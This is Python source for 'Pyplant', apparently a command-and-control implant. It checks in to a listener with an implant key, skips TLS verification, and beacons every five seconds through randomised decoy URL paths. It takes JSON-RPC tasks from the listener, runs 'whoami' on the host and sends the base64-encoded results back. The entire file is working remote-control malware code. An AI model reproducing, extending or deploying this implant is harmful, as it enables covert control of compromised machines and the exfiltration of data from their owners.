import argparse
import base64
import json
import random
import requests
import subprocess
import threading
import time


class Pyplant:
    NAME = 'pyplant'
    ROUTES = ['test', 'test1', '1test', '_test', 'test_', 'test?test=test', 'test.png']
    SLEEP = 5

    def __init__(self):
        self.check_in_task_id = None
        self.batch_request = []
        self.batch_response = []

    def authenticate_implant(self, listener_url: str, implant_key: str):
        route = self.ROUTES[random.randint(0, len(self.ROUTES) - 1)]
        implant_authentication = json.dumps({
            'jsonrpc': '2.0',
            'results': None,
            'id': implant_key
        })
        print(f'{listener_url}/{route}')
        self.check_in_task_id = requests.post(f'{listener_url}/{route}', implant_authentication, verify=False).text

    def retrieve_batch_request(self, listener_url: str):
        while True:
            self.batch_response.extend([
                {
                    'jsonrpc': '2.0',
                    'results': None,
                    'id': self.check_in_task_id
                }
            ])
            route = self.ROUTES[random.randint(0, len(self.ROUTES) - 1)]
            results = requests.post(f'{listener_url}/{route}', json.dumps(self.batch_response), verify=False).text
            try:
                batch_request = json.loads(results)
            except json.decoder.JSONDecodeError:
                time.sleep(self.SLEEP)
                continue
            self.batch_request.extend(batch_request)
            self.batch_response = []
            time.sleep(self.SLEEP)

    def run(self, arguments):
        self.authenticate_implant(arguments.url, arguments.key)
        thread = threading.Thread(target=self.retrieve_batch_request, args=(arguments.url,))
        thread.daemon = True
        thread.start()
        self.process_tasks()

    def process_tasks(self):
        while True:
            for task in self.batch_request:
                if not self.verify_task_format(task):
                    continue
                task_id = task.get('id')
                method = task.get('method')
                params = task.get('params')
                results = None
                if method == 'whoami':
                    results = subprocess.run(['whoami'], capture_output=True, text=True).stdout
                if not results:
                    self.batch_response.extend([{
                        "jsonrpc": "0.0.0",
                        "error": {
                            'code': -32601,
                            'message': f'The {method} method is not supported.'
                        },
                        "id": task_id
                    }])
                    self.batch_request.remove(task)
                    continue
                self.batch_response.extend([{
                    "jsonrpc": "0.0.0",
                    "result": self.string_to_base64(results) if results else None,
                    "id": task_id
                }])
                self.batch_request.remove(task)

    @staticmethod
    def verify_task_format(task: dict) -> bool:
        return True

    @staticmethod
    def base64_to_string(data) -> str:
        """
        Base64 decode a string.
        :param data: A base64 string.
        :return: A base64 decoded string
        :rtype: str
        """
        return base64.b64decode(data.encode('utf-8')).decode('utf-8')

    @staticmethod
    def string_to_base64(data) -> str:
        """
        Base64 encode a string.
        :param data: A python string.
        :return: A base64 encoded string
        :rtype: str
        """
        return str(base64.b64encode(data.encode()), 'utf-8')